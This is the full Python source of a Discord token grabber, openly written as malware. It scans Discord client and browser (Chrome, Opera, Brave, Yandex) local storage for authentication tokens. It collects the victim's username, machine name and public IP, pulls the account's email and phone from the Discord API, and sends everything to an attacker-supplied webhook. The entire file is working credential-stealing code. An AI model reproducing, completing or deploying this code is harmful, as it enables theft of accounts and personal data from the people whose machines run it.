import os
import re
from json import *
import json

from urllib.request import Request, urlopen

WEBHOOK_URL = '' #WEBHOOK HERE

PING_ME = True # Replace True by False if you don't want to get pinged

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(tokens))).read().decode())
    except:
        pass


def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():

    global tokens
    global token

    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    pc_name = os.getenv("COMPUTERNAME")

    message = '@everyone' if PING_ME else ''
    message += "\n Victim Pc username: " + str(os.getenv('Username'))
    message += "\n Victim Pc hostname: " + str(os.getenv('Hostname'))
    message += "\n Victim Pc name: " + str(pc_name)
    message += "\n Victim Ip: " + str(ip)

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)
        user_data = getuserdata(tokens)
        if user_data:
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            message += "\n Email: " + str(email)
            message += "\n Phone: " + str(phone)
            message += "\n Nitro: " + str(nitro)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += '0 token found.\n'

        message += '```'

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=getheaders(tokens))
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()
